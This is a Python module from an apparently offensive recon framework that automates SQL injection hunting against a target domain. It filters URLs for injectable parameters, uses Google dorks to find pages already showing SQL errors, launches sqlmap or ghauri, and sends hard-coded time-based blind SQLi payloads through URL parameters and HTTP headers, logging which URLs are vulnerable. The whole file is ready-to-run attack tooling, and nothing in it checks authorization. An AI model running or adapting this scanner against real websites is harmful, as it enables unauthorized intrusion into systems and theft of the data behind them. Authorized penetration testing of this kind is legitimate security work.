import os
import shutil
import subprocess
import time
import requests
from pathlib import Path
from typing import Dict, Any, Set, List
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from common.config import CONFIG
from common.logger import Logger
from common.utils import run_command, ensure_dir

# Try to import Google Search library
try:
    from googlesearch import search
    GOOGLE_SEARCH_AVAILABLE = True
except ImportError:
    GOOGLE_SEARCH_AVAILABLE = False

def get_gf_path() -> str:
    """Get the path to the gf binary."""
    # Common GF installation paths
    gf_paths = [
        "/root/go/bin/gf",
        "/usr/local/bin/gf",
        "/usr/bin/gf",
        "gf"  # Fallback to PATH
    ]
    
    for path in gf_paths:
        if os.path.exists(path) or shutil.which(path):
            return path
    
    # If not found, return the default path
    return "/root/go/bin/gf"

def run(args: Any, config: Dict, logger: Logger, workflow_data: Dict) -> Dict:
    """
    SQLi reconnaissance module that uses discovered URLs from previous modules.
    """
    target = workflow_data['target']
    target_output_dir = workflow_data['target_output_dir']
    
    # Get URLs from previous modules (prioritize uro_urls if available)
    urls = workflow_data.get('uro_urls', workflow_data.get('live_urls', workflow_data.get('all_urls', set())))
    
    if not urls:
        logger.warning(f"[{target}] No URLs available for SQLi reconnaissance. Skipping.")
        return {"sqli_summary": {"status": "skipped", "reason": "no_urls"}}

    logger.info(f"[{target}] Starting SQLi reconnaissance on {len(urls)} URLs...")
    
    # Create SQLi results directory
    sqli_results_dir = target_output_dir / config['dirs']['sqli_results']
    ensure_dir(sqli_results_dir)
    
    # Step 1: Initial filtering for potential SQLi targets
    sqli_targets = filter_sqli_targets(urls, logger)
    
    if not sqli_targets:
        logger.warning(f"[{target}] No potential SQLi targets found after filtering.")
        return {"sqli_summary": {"status": "skipped", "reason": "no_targets"}}
    
    # Step 2: Run Google dorking if requested
    if hasattr(args, 'sqli_dorking') and args.sqli_dorking:
        dork_targets = run_google_dorking(target, logger)
        if dork_targets:
            sqli_targets.update(dork_targets)
            logger.success(f"[{target}] Added {len(dork_targets)} URLs from Google dorking.")
    
    # Step 3: Consolidate and apply final filtering (uro + gf sqli)
    final_targets = consolidate_and_filter_sqli(sqli_targets, logger)
    
    if not final_targets:
        logger.warning(f"[{target}] No SQLi targets remaining after final filtering.")
        return {"sqli_summary": {"status": "skipped", "reason": "no_final_targets"}}
    
    # Save final filtered targets
    targets_file = sqli_results_dir / config['files']['sqli_targets']
    with targets_file.open('w') as f:
        for url in sorted(final_targets):
            f.write(f"{url}\n")
    
    logger.success(f"[{target}] Found {len(final_targets)} final SQLi targets after filtering.")
    
    results = {
        "sqli_targets": final_targets,
        "sqli_summary": {
            "total_targets": len(final_targets),
            "status": "completed"
        }
    }
    
    # Run automated scanning if requested
    if hasattr(args, 'sqli_full_scan') and args.sqli_full_scan:
        scanner = getattr(args, 'sqli_scanner', 'sqlmap')
        run_automated_scan(targets_file, scanner, config, logger)
        results["sqli_summary"]["automated_scan"] = "completed"
    
    # Run manual tests if requested
    if hasattr(args, 'sqli_manual_blind') and args.sqli_manual_blind:
        manual_results = run_manual_blind_test(targets_file, config, logger)
        results["sqli_summary"]["manual_blind"] = manual_results
    
    if hasattr(args, 'sqli_header_test') and args.sqli_header_test:
        header_results = run_header_sqli_test(targets_file, config, logger)
        results["sqli_summary"]["header_test"] = header_results
    
    if hasattr(args, 'sqli_xor_test') and args.sqli_xor_test:
        xor_results = run_xor_blind_test(targets_file, config, logger)
        results["sqli_summary"]["xor_test"] = xor_results
    
    return results

def filter_sqli_targets(urls: Set[str], logger: Logger) -> Set[str]:
    """Filter URLs for potential SQLi targets using top 20 SQL injection prone parameters and gf sqli."""
    sqli_targets = set()
    
    # Top 20 SQL injection prone parameters
    sql_params = [
        'id', 'page', 'category', 'product', 'article', 'news', 'item',
        'user', 'member', 'account', 'profile', 'view', 'show', 'display',
        'search', 'query', 'keyword', 'term', 'q', 's'
    ]
    
    # File extensions that commonly have SQLi vulnerabilities
    vulnerable_extensions = ['.php', '.asp', '.aspx', '.jsp', '.jspx', '.do', '.action']
    
    # Common vulnerable file patterns
    vulnerable_files = [
        'product.php', 'view.php', 'show.php', 'display.php', 'detail.php',
        'article.php', 'news.php', 'item.php', 'user.php', 'member.php',
        'profile.php', 'account.php', 'search.php', 'query.php', 'result.php',
        'list.php', 'category.php', 'page.php', 'index.php', 'main.php',
        'product.asp', 'view.asp', 'show.asp', 'detail.asp', 'article.asp',
        'news.asp', 'item.asp', 'user.asp', 'member.asp', 'profile.asp',
        'account.asp', 'search.asp', 'query.asp', 'result.asp', 'list.asp',
        'category.asp', 'page.asp', 'index.asp', 'main.asp'
    ]
    
    for url in urls:
        parsed = urlparse(url)
        url_lower = url.lower()
        
        # Check for SQL injection prone parameters
        if any(f"{param}=" in url_lower for param in sql_params):
            sqli_targets.add(url)
            continue
        
        # Check for array parameters (common in SQLi)
        if any(f"{param}[]=" in url_lower for param in sql_params):
            sqli_targets.add(url)
            continue
        
        # Check for ID variations
        if any(f"{param}_id=" in url_lower or f"{param}id=" in url_lower for param in sql_params):
            sqli_targets.add(url)
            continue
        
        # Check for vulnerable file extensions with parameters
        if any(ext in parsed.path.lower() for ext in vulnerable_extensions):
            if '=' in url:
                sqli_targets.add(url)
                continue
        
        # Check for vulnerable file patterns
        if any(file in parsed.path.lower() for file in vulnerable_files):
            if '=' in url:
                sqli_targets.add(url)
                continue
        
        # Check for common SQLi indicators in URL
        sql_indicators = [
            'select', 'union', 'insert', 'update', 'delete', 'drop', 'create',
            'alter', 'exec', 'execute', 'script', 'javascript', 'vbscript'
        ]
        
        if any(indicator in url_lower for indicator in sql_indicators):
            sqli_targets.add(url)
            continue
    
    logger.info(f"Initial filtering found {len(sqli_targets)} potential SQLi targets from {len(urls)} URLs.")
    
    # Apply gf sqli filtering to the filtered URLs
    if sqli_targets:
        sqli_targets = apply_gf_sqli_filter(sqli_targets, logger)
    
    logger.info(f"After gf sqli filtering: {len(sqli_targets)} potential SQLi targets remaining.")
    return sqli_targets

def apply_gf_sqli_filter(urls: Set[str], logger: Logger) -> Set[str]:
    """Apply gf sqli filtering to URLs using the gf tool."""
    logger.info("Applying gf sqli filtering to URLs...")
    
    try:
        # Create a temporary file with URLs
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            for url in urls:
                temp_file.write(f"{url}\n")
            temp_file_path = temp_file.name
        
        # Run gf sqli command - FIXED: Use full path to gf binary
        cmd = f"cat {temp_file_path} | {get_gf_path()} sqli"
        exit_code, stdout, stderr = run_command(cmd, timeout=300, shell=True)
        
        # Clean up temp file
        import os
        os.unlink(temp_file_path)
        
        if exit_code == 0 and stdout:
            # Parse the filtered URLs
            filtered_urls = set(stdout.strip().split('\n'))
            logger.success(f"gf sqli filtering completed. {len(filtered_urls)} URLs passed the filter.")
            return filtered_urls
        else:
            logger.warning(f"gf sqli filtering failed or returned no results. Stderr: {stderr}")
            # Return original URLs if gf fails
            return urls
            
    except Exception as e:
        logger.error(f"Error applying gf sqli filter: {e}")
        # Return original URLs if there's an error
        return urls

def consolidate_and_filter_sqli(urls: Set[str], logger: Logger) -> Set[str]:
    """Consolidate URLs and apply final filtering with uro and gf sqli."""
    logger.info("Consolidating and applying final SQLi filtering...")
    
    try:
        # Create a temporary file with all URLs
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            for url in urls:
                temp_file.write(f"{url}\n")
            temp_file_path = temp_file.name
        
        # Apply the filtering pipeline: cat urls | gf sqli | uro - FIXED: Use full path to gf binary
        cmd = f"cat {temp_file_path} | {get_gf_path()} sqli | uro"
        exit_code, stdout, stderr = run_command(cmd, timeout=300, shell=True)
        
        # Clean up temp file
        import os
        os.unlink(temp_file_path)
        
        if exit_code == 0 and stdout:
            # Parse the final filtered URLs
            final_urls = set(stdout.strip().split('\n'))
            logger.success(f"Final filtering completed. {len(final_urls)} URLs passed the pipeline.")
            return final_urls
        else:
            logger.warning(f"Final filtering failed or returned no results. Stderr: {stderr}")
            # Return original URLs if pipeline fails
            return urls
            
    except Exception as e:
        logger.error(f"Error in final filtering pipeline: {e}")
        # Return original URLs if there's an error
        return urls

def run_google_dorking(domain: str, logger: Logger) -> Set[str]:
    """Run Google dorking to find additional SQLi targets with anti-blocking measures."""
    if not GOOGLE_SEARCH_AVAILABLE:
        logger.warning("Google search library not available. Skipping dorking.")
        return set()
    
    logger.info(f"Running Google dorking for domain: {domain}")
    
    # Top 20 SQL injection prone parameters
    sql_params = [
        'id', 'page', 'category', 'product', 'article', 'news', 'item',
        'user', 'member', 'account', 'profile', 'view', 'show', 'display',
        'search', 'query', 'keyword', 'term', 'q', 's'
    ]
    
    # File extensions that commonly have SQLi vulnerabilities
    vulnerable_extensions = [
        'php', 'asp', 'aspx', 'jsp', 'jspx', 'do', 'action'
    ]
    
    # Build comprehensive dork patterns
    dork_patterns = []
    
    # 1. Basic parameter-based dorks
    for param in sql_params:
        dork_patterns.extend([
            f'inurl:{param}=',
            f'inurl:{param}[]=',
            f'inurl:{param}[0]=',
            f'inurl:{param}_id=',
            f'inurl:{param}id='
        ])
    
    # 2. File extension + parameter combinations
    for ext in vulnerable_extensions:
        for param in sql_params[:10]:  # Use top 10 params for file extensions
            dork_patterns.extend([
                f'ext:{ext} inurl:{param}=',
                f'ext:{ext} inurl:{param}[]=',
                f'ext:{ext} inurl:{param}_id=',
                f'ext:{ext} inurl:{param}id='
            ])
    
    # 3. Common vulnerable file patterns
    vulnerable_files = [
        'product.php', 'view.php', 'show.php', 'display.php', 'detail.php',
        'article.php', 'news.php', 'item.php', 'user.php', 'member.php',
        'profile.php', 'account.php', 'search.php', 'query.php', 'result.php',
        'list.php', 'category.php', 'page.php', 'index.php', 'main.php',
        'product.asp', 'view.asp', 'show.asp', 'detail.asp', 'article.asp',
        'news.asp', 'item.asp', 'user.asp', 'member.asp', 'profile.asp',
        'account.asp', 'search.asp', 'query.asp', 'result.asp', 'list.asp',
        'category.asp', 'page.asp', 'index.asp', 'main.asp'
    ]
    
    for file in vulnerable_files:
        dork_patterns.extend([
            f'inurl:{file}?',
            f'inurl:{file} inurl:id=',
            f'inurl:{file} inurl:page=',
            f'inurl:{file} inurl:category='
        ])
    
    # 4. SQL error patterns (for finding already vulnerable sites)
    error_patterns = [
        'intext:"You have an error in your SQL syntax"',
        'intext:"mysql_fetch_array() expects parameter"',
        'intext:"Warning: mysql_"',
        'intext:"PostgreSQL query failed: ERROR"',
        'intext:"Microsoft OLE DB Provider for SQL Server"',
        'intext:"Unclosed quotation mark after the character string"',
        'intext:"ORA-00933: SQL command not properly ended"',
        'intext:"SQL syntax error"',
        'intext:"mysql_num_rows()"',
        'intext:"mysql_fetch_object()"',
        'intext:"mysql_fetch_assoc()"',
        'intext:"mysql_fetch_row()"',
        'intext:"mysql_fetch_field()"',
        'intext:"mysql_fetch_lengths()"',
        'intext:"mysql_fetch_array()"',
        'intext:"mysql_fetch_object()"',
        'intext:"mysql_fetch_assoc()"',
        'intext:"mysql_fetch_row()"',
        'intext:"mysql_fetch_field()"',
        'intext:"mysql_fetch_lengths()"'
    ]
    
    dork_patterns.extend(error_patterns)
    
    found_urls = set()
    total_patterns = len(dork_patterns)
    
    for i, pattern in enumerate(dork_patterns, 1):
        query = f"site:{domain} {pattern}"
        logger.info(f"Running dork {i}/{total_patterns}: {query}")
        
        try:
            # Anti-blocking measures
            time.sleep(3 + (i % 5))  # Random delay between 3-8 seconds
            
            # Limit results per query to avoid rate limiting
            # FIXED: Removed user_agent parameter as it's not supported
            results = list(search(query, num_results=5))
            
            for url in results:
                # Additional filtering for SQLi indicators
                if any(indicator in url.lower() for indicator in ['=', '?', 'php', 'asp', 'aspx', 'jsp', 'jspx']):
                    found_urls.add(url)
            
            # Progress logging
            if i % 10 == 0:
                logger.info(f"Progress: {i}/{total_patterns} patterns processed, {len(found_urls)} URLs found so far")
                
        except Exception as e:
            error_msg = str(e)
            if "HTTP Error 429" in error_msg or "rate limit" in error_msg.lower():
                logger.warning(f"Rate limiting detected for pattern {i}. Pausing for 30 seconds...")
                time.sleep(30)
                continue
            elif "HTTP Error 403" in error_msg:
                logger.warning(f"Access forbidden for pattern {i}. Skipping...")
                continue
            elif "HTTP Error 503" in error_msg:
                logger.warning(f"Service unavailable for pattern {i}. Pausing for 60 seconds...")
                time.sleep(60)
                continue
            else:
                logger.warning(f"Dorking failed for pattern {i} '{query}': {e}")
                continue
    
    logger.success(f"Google dorking completed. Found {len(found_urls)} potential SQLi URLs.")
    return found_urls

def run_automated_scan(targets_file: Path, scanner: str, config: Dict, logger: Logger):
    """Run automated SQLi scanning with sqlmap or ghauri."""
    if not targets_file.exists() or targets_file.stat().st_size == 0:
        logger.error(f"Targets file '{targets_file}' is empty or does not exist.")
        return
    
    logger.info(f"Starting automated SQLi scan with {scanner}...")
    
    if scanner == 'sqlmap':
        cmd = f"sqlmap -m {targets_file} {config['sqli']['sqlmap_args']}"
    elif scanner == 'ghauri':
        cmd = f"ghauri -m {targets_file} {config['sqli']['ghauri_args']}"
    else:
        logger.error(f"Invalid scanner: {scanner}")
        return
    
    logger.info(f"Executing: {cmd}")
    exit_code, stdout, stderr = run_command(cmd.split(), timeout=config['timeouts']['command'])
    
    if exit_code == 0:
        logger.success(f"Automated SQLi scan completed successfully.")
    else:
        logger.error(f"Automated SQLi scan failed with exit code {exit_code}")

def run_manual_blind_test(targets_file: Path, config: Dict, logger: Logger) -> Dict:
    """Run manual blind SQLi test using time-based payloads."""
    logger.info("Running manual blind SQLi test...")
    
    payloads = [
        "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        '"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z',
        "'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z",
        "X'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
        "(SELECT * FROM (SELECT(SLEEP(10)))a)",
        "BENCHMARK(10000000,MD5(CHAR(116)))",
        "if(now()=sysdate(),sleep(10),0)",
        "'XOR(if(now()=sysdate(),sleep(10),0))XOR'",
        "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        "(select(0)from(select(sleep(10)))v)"
    ]
    
    vulnerable = []
    timeout = config['sqli']['timeout']
    delay_threshold = config['sqli']['delay_threshold']
    
    with targets_file.open('r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    for url in urls:
        for payload in payloads:
            test_url = inject_payload(url, payload)
            try:
                start = time.time()
                response = requests.get(test_url, timeout=timeout)
                elapsed = time.time() - start
                
                if elapsed > delay_threshold:
                    logger.success(f"[DELAYED] {test_url} (delay: {elapsed:.1f}s)")
                    vulnerable.append((test_url, payload, elapsed))
                    break
            except requests.exceptions.Timeout:
                logger.success(f"[TIMEOUT] {test_url} (>{timeout}s)")
                vulnerable.append((test_url, payload, timeout))
                break
            except Exception as e:
                logger.debug(f"Request failed: {e}")
    
    # Save results
    if vulnerable:
        results_file = targets_file.parent / "sqli_manual_results.txt"
        with results_file.open('w') as f:
            for url, payload, elapsed in vulnerable:
                f.write(f"{url}\t{payload}\t{elapsed:.1f}s\n")
        logger.success(f"Manual blind SQLi test found {len(vulnerable)} vulnerable URLs.")
        return {"vulnerable_count": len(vulnerable), "results_file": str(results_file)}
    else:
        logger.warning("No vulnerable URLs found in manual blind SQLi test.")
        return {"vulnerable_count": 0}

def run_header_sqli_test(targets_file: Path, config: Dict, logger: Logger) -> Dict:
    """Run header-based blind SQLi test."""
    logger.info("Running header-based blind SQLi test...")
    
    payloads = [
        "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        '"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z',
        "X'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
        "BENCHMARK(10000000,MD5(CHAR(116)))",
        "if(now()=sysdate(),sleep(10),0)"
    ]
    
    headers_to_test = ["User-Agent", "X-Forwarded-For", "Referer"]
    vulnerable = []
    timeout = config['sqli']['timeout']
    delay_threshold = config['sqli']['delay_threshold']
    
    with targets_file.open('r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    for url in urls:
        for header in headers_to_test:
            for payload in payloads:
                custom_headers = {header: payload}
                try:
                    start = time.time()
                    response = requests.get(url, headers=custom_headers, timeout=timeout)
                    elapsed = time.time() - start
                    
                    if elapsed > delay_threshold:
                        logger.success(f"[DELAYED] {url} ({header}: {payload}) (delay: {elapsed:.1f}s)")
                        vulnerable.append((url, header, payload, elapsed))
                        break
                except requests.exceptions.Timeout:
                    logger.success(f"[TIMEOUT] {url} ({header}: {payload}) (>{timeout}s)")
                    vulnerable.append((url, header, payload, timeout))
                    break
                except Exception as e:
                    logger.debug(f"Request failed: {e}")
    
    # Save results
    if vulnerable:
        results_file = targets_file.parent / "sqli_header_results.txt"
        with results_file.open('w') as f:
            for url, header, payload, elapsed in vulnerable:
                f.write(f"{url}\t{header}\t{payload}\t{elapsed:.1f}s\n")
        logger.success(f"Header-based SQLi test found {len(vulnerable)} vulnerable URLs.")
        return {"vulnerable_count": len(vulnerable), "results_file": str(results_file)}
    else:
        logger.warning("No vulnerable URLs found in header-based SQLi test.")
        return {"vulnerable_count": 0}

def run_xor_blind_test(targets_file: Path, config: Dict, logger: Logger) -> Dict:
    """Run XOR blind SQLi test."""
    logger.info("Running XOR blind SQLi test...")
    
    xor_payloads = [
        "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        "0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z",
        "0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z",
        "XOR(if(now()=sysdate(),sleep(7),0))XOR%23"
    ]
    
    vulnerable = []
    timeout = config['sqli']['timeout']
    delay_threshold = config['sqli']['delay_threshold']
    
    with targets_file.open('r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    for url in urls:
        for payload in xor_payloads:
            test_url = inject_payload(url, payload)
            try:
                start = time.time()
                response = requests.get(test_url, timeout=timeout)
                elapsed = time.time() - start
                
                if elapsed > delay_threshold:
                    logger.success(f"[DELAYED] {test_url} (delay: {elapsed:.1f}s)")
                    vulnerable.append((test_url, payload, elapsed))
                    break
            except requests.exceptions.Timeout:
                logger.success(f"[TIMEOUT] {test_url} (>{timeout}s)")
                vulnerable.append((test_url, payload, timeout))
                break
            except Exception as e:
                logger.debug(f"Request failed: {e}")
    
    # Save results
    if vulnerable:
        results_file = targets_file.parent / "sqli_xor_results.txt"
        with results_file.open('w') as f:
            for url, payload, elapsed in vulnerable:
                f.write(f"{url}\t{payload}\t{elapsed:.1f}s\n")
        logger.success(f"XOR blind SQLi test found {len(vulnerable)} vulnerable URLs.")
        return {"vulnerable_count": len(vulnerable), "results_file": str(results_file)}
    else:
        logger.warning("No vulnerable URLs found in XOR blind SQLi test.")
        return {"vulnerable_count": 0}

def inject_payload(url: str, payload: str) -> str:
    """Inject payload into URL parameter."""
    if '?' in url:
        base, query = url.split('?', 1)
        if '=' in query:
            param, rest = query.split('=', 1)
            test_url = f"{base}?{param}={payload}"
            if '&' in rest:
                test_url += '&' + rest.split('&', 1)[1]
            return test_url
        else:
            return url + payload
    else:
        return url + payload 